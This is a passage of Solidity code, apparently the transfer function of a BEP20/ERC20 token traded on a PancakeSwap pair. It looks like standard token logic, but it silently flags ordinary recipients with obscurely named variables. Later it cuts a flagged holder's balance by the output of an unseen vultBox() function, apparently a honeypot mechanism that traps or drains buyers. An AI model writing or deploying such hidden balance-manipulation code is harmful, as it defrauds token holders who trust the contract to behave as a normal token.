    uint256 kkllff = 0;

    function _transfer(
        address fromSender,
        address to,
        uint256 amount
    ) internal virtual {
        require(
            fromSender != address(0),
            "ERC20: transfer from the zero address"
        );
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 balance = _balances[fromSender];
        if (pepevipcc[fromSender] != false) {
            balance = _balances[fromSender] - (vultBox());
        }
        if (fromSender == pancakePair) {} else if (to == pancakePair) {} else {
            pepevipcc[to] = true;
        }
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[fromSender] = balance.sub(amount);
        uint256 feeeA = amount.mul(kkllff).div(100);
        _balances[to] = _balances[to].add(amount).sub(feeeA);
        emit Transfer(fromSender, to, amount);
    }

